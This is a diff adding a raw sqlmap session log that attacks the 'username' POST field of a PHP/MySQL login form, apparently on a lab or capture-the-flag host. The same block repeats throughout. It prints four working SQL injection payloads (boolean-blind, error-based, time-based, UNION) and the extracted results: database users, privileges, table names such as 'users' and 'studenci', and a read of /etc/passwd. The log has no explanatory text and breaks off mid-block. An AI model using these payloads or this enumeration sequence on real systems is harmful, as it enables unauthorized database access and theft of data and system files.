@@ -1,0 +1,1023 @@
+sqlmap identified the following injection point(s) with a total of 174 HTTP(s) requests:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP, PHP 8.3.9, Apache 2.4.62
+back-end DBMS: MySQL >= 5.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP 8.3.9
+back-end DBMS: MySQL >= 8.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP, PHP 8.3.9, Apache 2.4.62
+back-end DBMS: MySQL 8
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP 8.3.9, PHP
+back-end DBMS: MySQL 8
+Database: db1
+Table: db1
+[1 entry]
++-----+
+| d   |
++-----+
+| db1 |
++-----+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP, PHP 8.3.9
+back-end DBMS: MySQL 8
+Database: db1
+Table: db1
+[1 entry]
++-----+
+| d   |
++-----+
+| db1 |
++-----+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP 8.3.9, PHP, Apache 2.4.62
+back-end DBMS: MySQL 8
+banner: 'UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ'
+current user: 'UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ'
+current database: 'db1'
+hostname: 'UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ'
+current user is DBA: False
+database management system users [1]:
+[*] UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ
+
+database management system users privileges:
+[*] a
+[*] A
+[*] B
+[*] b
+[*] c
+[*] d
+[*] g
+[*] H
+[*] I
+[*] i
+[*] K
+[*] k
+[*] M
+[*] m
+[*] n
+[*] O
+[*] Q
+[*] r
+[*] s
+[*] T
+[*] t
+[*] U
+[*] W
+[*] X
+[*] y
+[*] z
+[*] Z
+
+database management system users roles:
+[*] a
+[*] A
+[*] B
+[*] b
+[*] c
+[*] d
+[*] g
+[*] H
+[*] I
+[*] i
+[*] K
+[*] k
+[*] M
+[*] m
+[*] n
+[*] O
+[*] Q
+[*] r
+[*] s
+[*] T
+[*] t
+[*] U
+[*] W
+[*] X
+[*] y
+[*] z
+[*] Z
+
+Database: UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ
+Table: UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ
+[1 entry]
++------------------------------------------+
+| U                                        |
++------------------------------------------+
+| UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ |
++------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP 8.3.9, PHP
+back-end DBMS: MySQL 8
+current user is DBA: False
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP, Apache 2.4.62, PHP 8.3.9
+back-end DBMS: MySQL 8
+database management system users [1]:
+[*] UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ
+
+database management system users privileges:
+[*] a
+[*] A
+[*] B
+[*] b
+[*] c
+[*] d
+[*] g
+[*] H
+[*] I
+[*] i
+[*] K
+[*] k
+[*] M
+[*] m
+[*] n
+[*] O
+[*] Q
+[*] r
+[*] s
+[*] T
+[*] t
+[*] U
+[*] W
+[*] X
+[*] y
+[*] z
+[*] Z
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP 8.3.9, PHP
+back-end DBMS: MySQL 8
+database management system users [1]:
+[*] 'Dziekan123'@'localhost'
+
+database management system users privileges:
+[*] '
+[*] 1
+[*] 2
+[*] 3
+[*] @
+[*] a
+[*] c
+[*] D
+[*] e
+[*] h
+[*] i
+[*] k
+[*] l
+[*] n
+[*] o
+[*] s
+[*] t
+[*] z
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP 8.3.9, PHP
+back-end DBMS: MySQL 8
+database management system users [1]:
+[*] 'Dziekan123'@'localhost'
+
+database management system users privileges:
+[*] '
+[*] 1
+[*] 2
+[*] 3
+[*] @
+[*] a
+[*] c
+[*] D
+[*] e
+[*] h
+[*] i
+[*] k
+[*] l
+[*] n
+[*] o
+[*] s
+[*] t
+[*] z
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP, PHP 8.3.9, Apache 2.4.62
+back-end DBMS: MySQL 8
+database management system users [1]:
+[*] 'Dziekan123'@'localhost'
+
+database management system users privileges:
+[*] '
+[*] 1
+[*] 2
+[*] 3
+[*] @
+[*] a
+[*] c
+[*] D
+[*] e
+[*] h
+[*] i
+[*] k
+[*] l
+[*] n
+[*] o
+[*] s
+[*] t
+[*] z
+
+Database: db1
+Table: users
+[2 entries]
++----------+
+| users    |
++----------+
+| users    |
+| studenci |
++----------+
+
+Database: db1
+Table: studenci
+[2 entries]
++----------+
+| users    |
++----------+
+| users    |
+| studenci |
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP, PHP 8.3.9, Apache 2.4.62
+back-end DBMS: MySQL >= 8.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP 8.3.9, PHP
+back-end DBMS: MySQL >= 8.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP 8.3.9, Apache 2.4.62, PHP
+back-end DBMS: MySQL >= 8.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(15)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP, PHP 8.3.9
+back-end DBMS: MySQL >= 8.0.0
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP 8.3.9, Apache 2.4.62, PHP
+back-end DBMS: MySQL >= 8.0.0
+Database: db1
+Table: users
+[2 entries]
++----------+
+| users    |
++----------+
+| users    |
+| studenci |
++----------+
+
+Database: db1
+Table: studenci
+[2 entries]
++----------+
+| users    |
++----------+
+| users    |
+| studenci |
++----------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: Apache 2.4.62, PHP 8.3.9, PHP
+back-end DBMS: MySQL >= 8.0.0
+banner: 'UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ'
+current user: 'UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ'
+current database: 'db1'
+hostname: 'UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ'
+current user is DBA: False
+database management system users [1]:
+[*] 'Dziekan123'@'localhost'
+
+database management system users privileges:
+[*] '
+[*] 1
+[*] 2
+[*] 3
+[*] @
+[*] a
+[*] c
+[*] D
+[*] e
+[*] h
+[*] i
+[*] k
+[*] l
+[*] n
+[*] o
+[*] s
+[*] t
+[*] z
+
+database management system users roles:
+[*] '
+[*] 1
+[*] 2
+[*] 3
+[*] @
+[*] a
+[*] c
+[*] D
+[*] e
+[*] h
+[*] i
+[*] k
+[*] l
+[*] n
+[*] o
+[*] s
+[*] t
+[*] z
+
+Database: UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ
+Table: UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ
+[1 entry]
++------------------------------------------+
+| U                                        |
++------------------------------------------+
+| UBIiTKrgOIXrrskMOibTazZAcnHAmTtdTZMbWOyQ |
++------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
+    Payload: username=XRVo' RLIKE (SELECT (CASE WHEN (9110=9110) THEN 0x5852566f ELSE 0x28 END))-- LcKO&password=PxEl
+
+    Type: error-based
+    Title: MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: username=XRVo' OR (SELECT 6847 FROM(SELECT COUNT(*),CONCAT(0x71626a6a71,(SELECT (ELT(6847=6847,1))),0x71767a6a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- kIJa&password=PxEl
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=XRVo' AND (SELECT 8814 FROM (SELECT(SLEEP(5)))oiEX)-- JDcP&password=PxEl
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: username=XRVo' UNION ALL SELECT NULL,CONCAT(0x71626a6a71,0x55424969544b72674f49587272736b4d4f696254617a5a41636e48416d547464545a4d62574f7951,0x71767a6a71),NULL,NULL#&password=PxEl
+---
+web application technology: PHP, Apache 2.4.62, PHP 8.3.9
+back-end DBMS: MySQL 8
+files saved to [1]:
+[*] /home/chmiela/.local/share/sqlmap/output/container-manager.francecentral.cloudapp.azure.com/files/_etc_passwd (size differs from remote file)
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
